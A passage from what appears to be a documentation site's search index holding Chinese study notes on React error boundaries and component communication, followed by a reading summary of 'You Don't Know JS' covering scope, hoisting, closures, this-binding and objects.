<p>\u6355\u83b7\u751f\u547d\u5468\u671f\u7684\u9519\u8bef\uff0c\u5e76\u4e0d\u80fd\u6355\u83b7\u5408\u6210\u4e8b\u4ef6\uff0c\u5b9a\u65f6\u5668\u4e2d\u7684\u9519\u8bef</p> </li> </ul> <pre><code>state = {\n  hasError: false,\n};\n\nstatic getDerivedStateFromError(error) {\n  console.log(error);\n  return {\n    hasError: true,\n  }\n}\n\ncomponentDidCatch(error, info) {\n  console.log(error, info);\n  // \u8fd9\u91cc\u53ef\u4ee5\u7528\u4e8e\u6570\u636e\u7edf\u8ba1\uff08\u8bb0\u5f55\u51fa\u9519\u7684\u95ee\u9898\u5e76\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff09\n}\n\nrender() {\n  return (\n    {this.state.hasError ? &lt;span&gt;\u51fa\u9519\u4e86\uff01\uff01\uff01&lt;/span&gt;: &lt;Child/&gt;}\n  );\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#126","title":"126 \u7ec4\u4ef6\u95f4\u901a\u4fe1\u65b9\u5f0f\u603b\u7ed3","text":"<p>\u7ec4\u4ef6\u95f4\u5173\u7cfb\uff1a\u7236\u5b50\u7ec4\u4ef6\uff1b\u5144\u5f1f\u7ec4\u4ef6\uff1b\u8de8\u7ea7\u7ec4\u4ef6\uff08\u591a\u7ea7\u5d4c\u5957\uff09</p> <p>\u7236\u5b50\u7ec4\u4ef6 props\uff1b\u5144\u5f1f\u7ec4\u4ef6 eventBus; \u8de8\u7ea7\u7ec4\u4ef6 context \u5168\u5c40\u53d8\u91cf</p> <p>\u72b6\u6001\u7ba1\u7406 redux react-redux</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/","title":"\u7cbe\u8bfb\u300a\u4f60\u4e0d\u77e5\u9053\u7684 javascript\uff08\u4e0a\u5377\uff09\u300b","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 13989  \u9605\u8bfb28\u5206\u949f</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_1","title":"\u524d\u8a00","text":"<p>\u300a\u4f60\u4e0d\u77e5\u9053\u7684 javascript\u300b\u662f\u4e00\u4e2a\u524d\u7aef\u5b66\u4e60\u5fc5\u8bfb\u7684\u7cfb\u5217\uff0c\u8ba9\u4e0d\u6c42\u751a\u89e3\u7684JavaScript\u5f00\u53d1\u8005\u8fce\u96be\u800c\u4e0a\uff0c\u6df1\u5165\u8bed\u8a00\u5185\u90e8\uff0c\u5f04\u6e05\u695aJavaScript\u6bcf\u4e00\u4e2a\u96f6\u90e8\u4ef6\u7684\u7528\u9014\u3002\u672c\u4e66\u4ecb\u7ecd\u4e86\u8be5\u7cfb\u5217\u7684\u4e24\u4e2a\u4e3b\u9898\uff1a\u201c\u4f5c\u7528\u57df\u548c\u95ed\u5305\u201d\u4ee5\u53ca\u201cthis\u548c\u5bf9\u8c61\u539f\u578b\u201d\u3002\u8fd9\u4e24\u5757\u4e5f\u662f\u503c\u5f97\u6211\u4eec\u53cd\u590d\u53bb\u5b66\u4e60\u7422\u78e8\u7684\u4e24\u5757\u53ea\u662f\u5185\u5bb9\uff0c\u4eca\u5929\u6211\u4eec\u7528\u601d\u7ef4\u5bfc\u56fe\u7684\u65b9\u5f0f\u6765\u7cbe\u8bfb\u4e00\u904d\u3002\uff08\u601d\u7ef4\u5bfc\u56fe\u56fe\u7247\u53ef\u80fd\u6709\u70b9\u5c0f\uff0c\u8bb0\u5f97\u70b9\u5f00\u770b\uff0c\u4f60\u4f1a\u6709\u6240\u6536\u83b7\uff09</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_2","title":"\u7b2c\u4e00\u90e8\u5206 \u4f5c\u7528\u57df\u548c\u95ed\u5305","text":""},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_3","title":"\u4f5c\u7528\u57df\u662f\u4ec0\u4e48","text":"<p>\u4f5c\u7528\u57df\u662f\u4e00\u5957\u89c4\u5219,\u7528\u4e8e\u786e\u5b9a\u5728\u4f55\u5904\u4ee5\u53ca\u5982\u4f55\u67e5\u627e\u53d8\u91cf(\u6807\u8bc6\u7b26)\u3002\u5982\u679c\u67e5\u627e\u7684\u76ee\u7684\u662f\u5bf9 \u53d8\u91cf\u8fdb\u884c\u8d4b\u503c,\u90a3\u4e48\u5c31\u4f1a\u4f7f\u7528 LHS \u67e5\u8be2;\u5982\u679c\u76ee\u7684\u662f\u83b7\u53d6\u53d8\u91cf\u7684\u503c,\u5c31\u4f1a\u4f7f\u7528 RHS \u67e5\u8be2\u3002\u8d4b\u503c\u64cd\u4f5c\u7b26\u4f1a\u5bfc\u81f4 LHS \u67e5\u8be2\u3002 \u7684\u8d4b\u503c\u64cd\u4f5c\u3002 =\u64cd\u4f5c\u7b26\u6216\u8c03\u7528\u51fd\u6570\u65f6\u4f20\u5165\u53c2\u6570\u7684\u64cd\u4f5c\u90fd\u4f1a\u5bfc\u81f4\u5173\u8054\u4f5c\u7528\u57df\u7684\u8d4b\u503c\u64cd\u4f5c\u3002 JavaScript \u5f15\u64ce\u9996\u5148\u4f1a\u5728\u4ee3\u7801\u6267\u884c\u524d\u5bf9\u5176\u8fdb\u884c\u7f16\u8bd1,\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d,\u50cf var a = 2 \u8fd9\u6837\u7684\u58f0 \u660e\u4f1a\u88ab\u5206\u89e3\u6210\u4e24\u4e2a\u72ec\u7acb\u7684\u6b65\u9aa4\uff1a</p> <ol> <li>\u9996\u5148, var a \u5728\u5176\u4f5c\u7528\u57df\u4e2d\u58f0\u660e\u65b0\u53d8\u91cf\u3002\u8fd9\u4f1a\u5728\u6700\u5f00\u59cb\u7684\u9636\u6bb5,\u4e5f\u5c31\u662f\u4ee3\u7801\u6267\u884c\u524d\u8fdb\u884c\u3002</li> <li>\u63a5\u4e0b\u6765, a = 2 \u4f1a\u67e5\u8be2(LHS \u67e5\u8be2)\u53d8\u91cf a \u5e76\u5bf9\u5176\u8fdb\u884c\u8d4b\u503c\u3002</li> </ol> <p>LHS \u548c RHS \u67e5\u8be2\u90fd\u4f1a\u5728\u5f53\u524d\u6267\u884c\u4f5c\u7528\u57df\u4e2d\u5f00\u59cb,\u5982\u679c\u6709\u9700\u8981(\u4e5f\u5c31\u662f\u8bf4\u5b83\u4eec\u6ca1\u6709\u627e\u5230\u6240 \u9700\u7684\u6807\u8bc6\u7b26),\u5c31\u4f1a\u5411\u4e0a\u7ea7\u4f5c\u7528\u57df\u7ee7\u7eed\u67e5\u627e\u76ee\u6807\u6807\u8bc6\u7b26,\u8fd9\u6837\u6bcf\u6b21\u4e0a\u5347\u4e00\u7ea7\u4f5c\u7528\u57df(\u4e00\u5c42 \u697c),\u6700\u540e\u62b5\u8fbe\u5168\u5c40\u4f5c\u7528\u57df(\u9876\u5c42),\u65e0\u8bba\u627e\u5230\u6216\u6ca1\u627e\u5230\u90fd\u5c06\u505c\u6b62\u3002</p> <p>\u4e0d\u6210\u529f\u7684RHS\u5f15\u7528\u4f1a\u5bfc\u81f4\u629b\u51fa ReferenceError \u5f02\u5e38\u3002\u4e0d\u6210\u529f\u7684 LHS \u5f15\u7528\u4f1a\u5bfc\u81f4\u81ea\u52a8\u9690\u5f0f\u5730\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf(\u975e\u4e25\u683c\u6a21\u5f0f\u4e0b),\u8be5\u53d8\u91cf\u4f7f\u7528 LHS \u5f15\u7528\u7684\u76ee\u6807\u4f5c\u4e3a\u6807\u8bc6\u7b26,\u6216\u8005\u629b \u51fa ReferenceError \u5f02\u5e38(\u4e25\u683c\u6a21\u5f0f\u4e0b)\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_4","title":"\u8bcd\u6cd5\u4f5c\u7528\u57df","text":"<p>\u8bcd\u6cd5\u4f5c\u7528\u57df\u610f\u5473\u7740\u4f5c\u7528\u57df\u662f\u7531\u4e66\u5199\u4ee3\u7801\u65f6\u51fd\u6570\u58f0\u660e\u7684\u4f4d\u7f6e\u6765\u51b3\u5b9a\u7684\u3002\u7f16\u8bd1\u7684\u8bcd\u6cd5\u5206\u6790\u9636\u6bb5 \u57fa\u672c\u80fd\u591f\u77e5\u9053\u5168\u90e8\u6807\u8bc6\u7b26\u5728\u54ea\u91cc\u4ee5\u53ca\u662f\u5982\u4f55\u58f0\u660e\u7684,\u4ece\u800c\u80fd\u591f\u9884\u6d4b\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u5982\u4f55\u5bf9\u5b83 \u4eec\u8fdb\u884c\u67e5\u627e\u3002</p> <p>JavaScript \u4e2d\u6709\u4e24\u4e2a\u673a\u5236\u53ef\u4ee5\u201c\u6b3a\u9a97\u201d\u8bcd\u6cd5\u4f5c\u7528\u57df: eval(..) \u548c with \u3002 \u524d\u8005\u53ef\u4ee5\u5bf9\u4e00\u6bb5\u5305 \u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u58f0\u660e\u7684\u201c\u4ee3\u7801\u201d\u5b57\u7b26\u4e32\u8fdb\u884c\u6f14\u7b97,\u5e76\u501f\u6b64\u6765\u4fee\u6539\u5df2\u7ecf\u5b58\u5728\u7684\u8bcd\u6cd5\u4f5c\u7528\u57df(\u5728 \u8fd0\u884c\u65f6)\u3002\u540e\u8005\u672c\u8d28\u4e0a\u662f\u901a\u8fc7\u5c06\u4e00\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528 \u5f53\u4f5c \u4f5c\u7528\u57df\u6765\u5904\u7406,\u5c06\u5bf9\u8c61\u7684\u5c5e\u6027\u5f53\u4f5c\u4f5c \u7528\u57df\u4e2d\u7684\u6807\u8bc6\u7b26\u6765\u5904\u7406,\u4ece\u800c\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u8bcd\u6cd5\u4f5c\u7528\u57df(\u540c\u6837\u662f\u5728\u8fd0\u884c\u65f6)\u3002</p> <p>\u8fd9\u4e24\u4e2a\u673a\u5236\u7684\u526f\u4f5c\u7528\u662f\u5f15\u64ce\u65e0\u6cd5\u5728\u7f16\u8bd1\u65f6\u5bf9\u4f5c\u7528\u57df\u67e5\u627e\u8fdb\u884c\u4f18\u5316,\u56e0\u4e3a\u5f15\u64ce\u53ea\u80fd\u8c28\u614e\u5730\u8ba4 \u4e3a\u8fd9\u6837\u7684\u4f18\u5316\u662f\u65e0\u6548\u7684\u3002\u4f7f\u7528\u8fd9\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u673a\u5236\u90fd \u5c06 \u5bfc\u81f4\u4ee3\u7801\u8fd0\u884c\u53d8\u6162\u3002 \u4e0d\u8981\u4f7f\u7528\u5b83\u4eec\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_5","title":"\u51fd\u6570\u4f5c\u7528\u57df\u548c\u5757\u4f5c\u7528\u57df","text":"<p>\u51fd\u6570\u662f JavaScript \u4e2d\u6700\u5e38\u89c1\u7684\u4f5c\u7528\u57df\u5355\u5143\u3002\u672c\u8d28\u4e0a,\u58f0\u660e\u5728\u4e00\u4e2a\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf\u6216\u51fd\u6570\u4f1a \u5728\u6240\u5904\u7684\u4f5c\u7528\u57df\u4e2d\u201c\u9690\u85cf\u201d\u8d77\u6765,\u8fd9\u662f\u6709\u610f\u4e3a\u4e4b\u7684\u826f\u597d\u8f6f\u4ef6\u7684\u8bbe\u8ba1\u539f\u5219\u3002</p> <p>\u4f46\u51fd\u6570\u4e0d\u662f\u552f\u4e00\u7684\u4f5c\u7528\u57df\u5355\u5143\u3002\u5757\u4f5c\u7528\u57df\u6307\u7684\u662f\u53d8\u91cf\u548c\u51fd\u6570\u4e0d\u4ec5\u53ef\u4ee5\u5c5e\u4e8e\u6240\u5904\u7684\u4f5c\u7528\u57df, \u4e5f\u53ef\u4ee5\u5c5e\u4e8e\u67d0\u4e2a\u4ee3\u7801\u5757(\u901a\u5e38\u6307 { .. } \u5185\u90e8)\u3002</p> <p>\u4ece ES3 \u5f00\u59cb, try/catch \u7ed3\u6784\u5728 catch \u5206\u53e5\u4e2d\u5177\u6709\u5757\u4f5c\u7528\u57df\u3002\u5728 ES6 \u4e2d\u5f15\u5165\u4e86 let \u5173\u952e\u5b57( var \u5173\u952e\u5b57\u7684\u8868\u4eb2), \u7528\u6765\u5728\u4efb\u610f\u4ee3\u7801\u5757\u4e2d\u58f0\u660e\u53d8\u91cf\u3002 if(..) { let a = 2; } \u4f1a\u58f0\u660e\u4e00\u4e2a\u52ab\u6301\u4e86 if \u7684 { .. } \u5757\u7684\u53d8\u91cf,\u5e76\u4e14\u5c06\u53d8\u91cf\u6dfb\u52a0\u5230\u8fd9\u4e2a\u5757 \u4e2d\u3002</p> <p>\u6709\u4e9b\u4eba\u8ba4\u4e3a\u5757\u4f5c\u7528\u57df\u4e0d\u5e94\u8be5\u5b8c\u5168\u4f5c\u4e3a\u51fd\u6570\u4f5c\u7528\u57df\u7684\u66ff\u4ee3\u65b9\u6848\u3002\u4e24\u79cd\u529f\u80fd\u5e94\u8be5\u540c\u65f6\u5b58\u5728,\u5f00 \u53d1\u8005\u53ef\u4ee5\u5e76\u4e14\u4e5f\u5e94\u8be5\u6839\u636e\u9700\u8981\u9009\u62e9\u4f7f\u7528\u4f55\u79cd\u4f5c\u7528\u57df,\u521b\u9020\u53ef\u8bfb\u3001\u53ef\u7ef4\u62a4\u7684\u4f18\u826f\u4ee3\u7801\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_6","title":"\u63d0\u5347","text":"<p>\u6211\u4eec\u4e60\u60ef\u5c06 var a = 2; \u770b\u4f5c\u4e00\u4e2a\u58f0\u660e,\u800c\u5b9e\u9645\u4e0a JavaScript \u5f15\u64ce\u5e76\u4e0d\u8fd9\u4e48\u8ba4\u4e3a\u3002\u5b83\u5c06 var a \u548c a = 2 \u5f53\u4f5c\u4e24\u4e2a\u5355\u72ec\u7684\u58f0\u660e,\u7b2c\u4e00\u4e2a\u662f\u7f16\u8bd1\u9636\u6bb5\u7684\u4efb\u52a1,\u800c\u7b2c\u4e8c\u4e2a\u5219\u662f\u6267\u884c\u9636\u6bb5\u7684\u4efb\u52a1\u3002</p> <p>\u8fd9\u610f\u5473\u7740\u65e0\u8bba\u4f5c\u7528\u57df\u4e2d\u7684\u58f0\u660e\u51fa\u73b0\u5728\u4ec0\u4e48\u5730\u65b9,\u90fd\u5c06\u5728\u4ee3\u7801\u672c\u8eab\u88ab\u6267\u884c\u524d \u9996\u5148 \u8fdb\u884c\u5904\u7406\u3002 \u53ef\u4ee5\u5c06\u8fd9\u4e2a\u8fc7\u7a0b\u5f62\u8c61\u5730\u60f3\u8c61\u6210\u6240\u6709\u7684\u58f0\u660e(\u53d8\u91cf\u548c\u51fd\u6570)\u90fd\u4f1a\u88ab\u201c\u79fb\u52a8\u201d\u5230\u5404\u81ea\u4f5c\u7528\u57df\u7684\u6700\u9876\u7aef,\u8fd9\u4e2a\u8fc7\u7a0b\u88ab\u79f0\u4e3a\u63d0\u5347\u3002</p> <p>\u58f0\u660e\u672c\u8eab\u4f1a\u88ab\u63d0\u5347,\u800c\u5305\u62ec\u51fd\u6570\u8868\u8fbe\u5f0f\u7684\u8d4b\u503c\u5728\u5185\u7684\u8d4b\u503c\u64cd\u4f5c\u5e76\u4e0d\u4f1a\u63d0\u5347\u3002</p> <p>\u8981\u6ce8\u610f\u907f\u514d\u91cd\u590d\u58f0\u660e,\u7279\u522b\u662f\u5f53\u666e\u901a\u7684 var \u58f0\u660e\u548c\u51fd\u6570\u58f0\u660e\u6df7\u5408\u5728\u4e00\u8d77\u7684\u65f6\u5019,\u5426\u5219\u4f1a\u5f15 \u8d77\u5f88\u591a\u5371\u9669\u7684\u95ee\u9898!</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_7","title":"\u4f5c\u7528\u57df\u95ed\u5305","text":"<p>\u95ed\u5305\u5c31\u597d\u50cf\u4ece JavaScript \u4e2d\u5206\u79bb\u51fa\u6765\u7684\u4e00\u4e2a\u5145\u6ee1\u795e\u79d8\u8272\u5f69\u7684\u672a\u5f00\u5316\u4e16\u754c,\u53ea\u6709\u6700\u52c7\u6562\u7684\u4eba \u624d\u80fd\u591f\u5230\u8fbe\u90a3\u91cc\u3002\u4f46\u5b9e\u9645\u4e0a\u5b83\u53ea\u662f\u4e00\u4e2a\u6807\u51c6,\u663e\u7136\u5c31\u662f\u5173\u4e8e\u5982\u4f55\u5728\u51fd\u6570\u4f5c\u4e3a\u503c\u6309\u9700\u4f20\u9012\u7684 \u8bcd\u6cd5\u73af\u5883\u4e2d\u4e66\u5199\u4ee3\u7801\u7684\u3002</p> <p>\u5f53\u51fd\u6570\u53ef\u4ee5\u8bb0\u4f4f\u5e76\u8bbf\u95ee\u6240\u5728\u7684\u8bcd\u6cd5\u4f5c\u7528\u57df,\u5373\u4f7f\u51fd\u6570\u662f\u5728\u5f53\u524d\u8bcd\u6cd5\u4f5c\u7528\u57df\u4e4b\u5916\u6267\u884c,\u8fd9\u65f6 \u5c31\u4ea7\u751f\u4e86\u95ed\u5305\u3002</p> <p>\u5982\u679c\u6ca1\u80fd\u8ba4\u51fa\u95ed\u5305,\u4e5f\u4e0d\u4e86\u89e3\u5b83\u7684\u5de5\u4f5c\u539f\u7406,\u5728\u4f7f\u7528\u5b83\u7684\u8fc7\u7a0b\u4e2d\u5c31\u5f88\u5bb9\u6613\u72af\u9519,\u6bd4\u5982\u5728\u5faa \u73af\u4e2d\u3002\u4f46\u540c\u65f6\u95ed\u5305\u4e5f\u662f\u4e00\u4e2a\u975e\u5e38\u5f3a\u5927\u7684\u5de5\u5177,\u53ef\u4ee5\u7528\u591a\u79cd\u5f62\u5f0f\u6765\u5b9e\u73b0 \u6a21\u5757 \u7b49\u6a21\u5f0f\u3002\u6a21\u5757\u6709\u4e24\u4e2a\u4e3b\u8981\u7279\u5f81:</p> <p>(1)\u4e3a\u521b\u5efa\u5185\u90e8\u4f5c\u7528\u57df\u800c\u8c03\u7528\u4e86\u4e00\u4e2a\u5305\u88c5\u51fd\u6570; (2)\u5305\u88c5\u51fd\u6570\u7684\u8fd4\u56de \u503c\u5fc5\u987b\u81f3\u5c11\u5305\u62ec\u4e00\u4e2a\u5bf9\u5185\u90e8\u51fd\u6570\u7684\u5f15\u7528,\u8fd9\u6837\u5c31\u4f1a\u521b\u5efa\u6db5\u76d6\u6574\u4e2a\u5305\u88c5\u51fd\u6570\u5185\u90e8\u4f5c\u7528\u57df\u7684\u95ed \u5305\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u4f1a\u53d1\u73b0\u4ee3\u7801\u4e2d\u5230\u5904\u90fd\u6709\u95ed\u5305\u5b58\u5728,\u5e76\u4e14\u6211\u4eec\u80fd\u591f\u8bc6\u522b\u95ed\u5305\u7136\u540e\u7528\u5b83\u6765\u505a\u4e00\u4e9b\u6709\u7528 \u7684\u4e8b!</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#this","title":"\u7b2c\u4e8c\u90e8\u5206 this \u548c\u5bf9\u8c61\u539f\u578b","text":""},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#this_1","title":"this \u5168\u9762\u89e3\u6790","text":"<p>\u5982\u679c\u8981\u5224\u65ad\u4e00\u4e2a\u8fd0\u884c\u4e2d\u51fd\u6570\u7684 this \u7ed1\u5b9a,\u5c31\u9700\u8981\u627e\u5230\u8fd9\u4e2a\u51fd\u6570\u7684\u76f4\u63a5\u8c03\u7528\u4f4d\u7f6e\u3002\u627e\u5230\u4e4b\u540e \u5c31\u53ef\u4ee5\u987a\u5e8f\u5e94\u7528\u4e0b\u9762\u8fd9\u56db\u6761\u89c4\u5219\u6765\u5224\u65ad this \u7684\u7ed1\u5b9a\u5bf9\u8c61\u3002</p> <ol> <li>\u7531 new \u8c03\u7528?\u7ed1\u5b9a\u5230\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u3002</li> <li>\u7531 call \u6216\u8005 apply (\u6216\u8005 bind )\u8c03\u7528?\u7ed1\u5b9a\u5230\u6307\u5b9a\u7684\u5bf9\u8c61\u3002</li> <li>\u7531\u4e0a\u4e0b\u6587\u5bf9\u8c61\u8c03\u7528?\u7ed1\u5b9a\u5230\u90a3\u4e2a\u4e0a\u4e0b\u6587\u5bf9\u8c61\u3002</li> <li>\u9ed8\u8ba4:\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\u7ed1\u5b9a\u5230 undefined ,\u5426\u5219\u7ed1\u5b9a\u5230\u5168\u5c40\u5bf9\u8c61\u3002</li> </ol> <p>\u4e00\u5b9a\u8981\u6ce8\u610f,\u6709\u4e9b\u8c03\u7528\u53ef\u80fd\u5728\u65e0\u610f\u4e2d\u4f7f\u7528\u9ed8\u8ba4\u7ed1\u5b9a\u89c4\u5219\u3002\u5982\u679c\u60f3\u201c\u66f4\u5b89\u5168\u201d\u5730\u5ffd\u7565 this \u7ed1 \u5b9a,\u4f60\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a DMZ \u5bf9\u8c61,\u6bd4\u5982 \u00f8 = Object.create(null) ,\u4ee5\u4fdd\u62a4\u5168\u5c40\u5bf9\u8c61\u3002ES6\u4e2d\u7684\u7bad\u5934\u51fd\u6570\u5e76\u4e0d\u4f1a\u4f7f\u7528\u56db\u6761\u6807\u51c6\u7684\u7ed1\u5b9a\u89c4\u5219, \u800c\u662f\u6839\u636e\u5f53\u524d\u7684\u8bcd\u6cd5\u4f5c\u7528\u57df\u6765\u51b3\u5b9a this ,\u5177\u4f53\u6765\u8bf4,\u7bad\u5934\u51fd\u6570\u4f1a\u7ee7\u627f\u5916\u5c42\u51fd\u6570\u8c03\u7528\u7684 this \u7ed1\u5b9a(\u65e0\u8bba this \u7ed1\u5b9a\u5230\u4ec0\u4e48)\u3002\u8fd9 \u5176\u5b9e\u548c ES6 \u4e4b\u524d\u4ee3\u7801\u4e2d\u7684 self = this \u673a\u5236\u4e00\u6837\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_8","title":"\u5bf9\u8c61","text":"<p>JavaScript \u4e2d\u7684\u5bf9\u8c61\u6709\u5b57\u9762\u5f62\u5f0f(\u6bd4\u5982 var a = { .. } )\u548c\u6784\u9020\u5f62\u5f0f(\u6bd4\u5982 var a = new Array(..) )\u3002\u5b57\u9762\u5f62\u5f0f\u66f4\u5e38\u7528,\u4e0d\u8fc7\u6709\u65f6\u5019\u6784\u9020\u5f62\u5f0f\u53ef\u4ee5\u63d0\u4f9b\u66f4\u591a\u9009\u9879\u3002</p> <p>\u8bb8\u591a\u4eba\u90fd\u4ee5\u4e3a\u201cJavaScript \u4e2d\u4e07\u7269\u90fd\u662f\u5bf9\u8c61\u201d,\u8fd9\u662f\u9519\u8bef\u7684\u3002\u5bf9\u8c61\u662f 6 \u4e2a(\u6216\u8005\u662f 7 \u4e2a,\u53d6 \u51b3\u4e8e\u4f60\u7684\u89c2\u70b9)\u57fa\u7840\u7c7b\u578b\u4e4b\u4e00\u3002\u5bf9\u8c61\u6709\u5305\u62ec function \u5728\u5185\u7684\u5b50\u7c7b\u578b,\u4e0d\u540c\u5b50\u7c7b\u578b\u5177\u6709\u4e0d\u540c \u7684\u884c\u4e3a,\u6bd4\u5982\u5185\u90e8\u6807\u7b7e [object Array] \u8868\u793a\u8fd9\u662f\u5bf9\u8c61\u7684\u5b50\u7c7b\u578b\u6570\u7ec4\u3002</p> <p>\u5bf9\u8c61\u5c31\u662f\u952e / \u503c\u5bf9\u7684\u96c6\u5408\u3002\u53ef\u4ee5\u901a\u8fc7 .propName \u6216\u8005 [\"propName\"] \u8bed\u6cd5\u6765\u83b7\u53d6\u5c5e\u6027\u503c\u3002\u8bbf \u95ee\u5c5e\u6027\u65f6, \u5f15\u64ce\u5b9e\u9645\u4e0a\u4f1a\u8c03\u7528\u5185\u90e8\u7684\u9ed8\u8ba4 [[Get]] \u64cd\u4f5c(\u5728\u8bbe\u7f6e\u5c5e\u6027\u503c\u65f6\u662f [[Put]] ), [[Get]] \u64cd\u4f5c\u4f1a\u68c0\u67e5\u5bf9\u8c61\u672c\u8eab\u662f\u5426\u5305\u542b\u8fd9\u4e2a\u5c5e\u6027,\u5982\u679c\u6ca1\u627e\u5230\u7684\u8bdd\u8fd8\u4f1a\u67e5\u627e [[Prototype]] \u94fe(\u53c2\u89c1\u7b2c 5 \u7ae0)\u3002</p> <p>\u5c5e\u6027\u7684\u7279\u6027\u53ef\u4ee5\u901a\u8fc7\u5c5e\u6027\u63cf\u8ff0\u7b26\u6765\u63a7\u5236,\u6bd4\u5982 writable \u548c configurable \u3002\u6b64\u5916,\u53ef\u4ee5\u4f7f\u7528 Object.preventExtensions(..) \u3001 Object.seal(..) \u548c Object.freeze(..) \u6765\u8bbe\u7f6e\u5bf9\u8c61(\u53ca\u5176 \u5c5e\u6027)\u7684\u4e0d\u53ef\u53d8\u6027\u7ea7\u522b\u3002</p> <p>\u5c5e\u6027\u4e0d\u4e00\u5b9a\u5305\u542b\u503c\u2014\u2014\u5b83\u4eec\u53ef\u80fd\u662f\u5177\u5907 getter/setter \u7684\u201c\u8bbf\u95ee\u63cf\u8ff0\u7b26\u201d\u3002\u6b64\u5916,\u5c5e\u6027\u53ef\u4ee5\u662f \u53ef\u679a\u4e3e\u6216\u8005\u4e0d\u53ef\u679a\u4e3e\u7684,\u8fd9\u51b3\u5b9a\u4e86\u5b83\u4eec\u662f\u5426\u4f1a\u51fa\u73b0\u5728 for..in \u5faa\u73af\u4e2d\u3002</p> <p>\u4f60\u53ef\u4ee5\u4f7f\u7528 ES6 \u7684 for..of \u8bed\u6cd5\u6765\u904d\u5386\u6570\u636e\u7ed3\u6784(\u6570\u7ec4\u3001\u5bf9\u8c61, \u7b49\u7b49)\u4e2d\u7684\u503c, for..of \u4f1a\u5bfb\u627e\u5185\u7f6e\u6216\u8005\u81ea\u5b9a\u4e49\u7684 @@iterator \u5bf9\u8c61\u5e76\u8c03\u7528\u5b83\u7684 next() \u65b9\u6cd5\u6765\u904d\u5386\u6570\u636e\u503c\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_9","title":"\u6df7\u5408\u5bf9\u8c61\"\u7c7b\"","text":"<p>\u7c7b\u662f\u4e00\u79cd\u8bbe\u8ba1\u6a21\u5f0f\u3002 \u8bb8\u591a\u8bed\u8a00\u63d0\u4f9b\u4e86\u5bf9\u4e8e\u9762\u5411\u7c7b\u8f6f\u4ef6\u8bbe\u8ba1\u7684\u539f\u751f\u8bed\u6cd5\u3002 JavaScript \u4e5f\u6709\u7c7b \u4f3c\u7684\u8bed\u6cd5,\u4f46\u662f\u548c\u5176\u4ed6\u8bed\u8a00\u4e2d\u7684\u7c7b\u5b8c\u5168\u4e0d\u540c\u3002</p> <p>\u7c7b\u610f\u5473\u7740\u590d\u5236\u3002</p> <p>\u4f20\u7edf\u7684\u7c7b\u88ab\u5b9e\u4f8b\u5316\u65f6,\u5b83\u7684\u884c\u4e3a\u4f1a\u88ab\u590d\u5236\u5230\u5b9e\u4f8b\u4e2d\u3002\u7c7b\u88ab\u7ee7\u627f\u65f6,\u884c\u4e3a\u4e5f\u4f1a\u88ab\u590d\u5236\u5230\u5b50\u7c7b \u4e2d\u3002</p> <p>\u591a\u6001(\u5728\u7ee7\u627f\u94fe\u7684\u4e0d\u540c\u5c42\u6b21\u540d\u79f0\u76f8\u540c\u4f46\u662f\u529f\u80fd\u4e0d\u540c\u7684\u51fd\u6570)\u770b\u8d77\u6765\u4f3c\u4e4e\u662f\u4ece\u5b50\u7c7b\u5f15\u7528\u7236 \u7c7b,\u4f46\u662f\u672c\u8d28\u4e0a\u5f15\u7528\u7684\u5176\u5b9e\u662f\u590d\u5236\u7684\u7ed3\u679c\u3002</p> <p>JavaScript \u5e76\u4e0d\u4f1a(\u50cf\u7c7b\u90a3\u6837)\u81ea\u52a8\u521b\u5efa\u5bf9\u8c61\u7684\u526f\u672c\u3002</p> 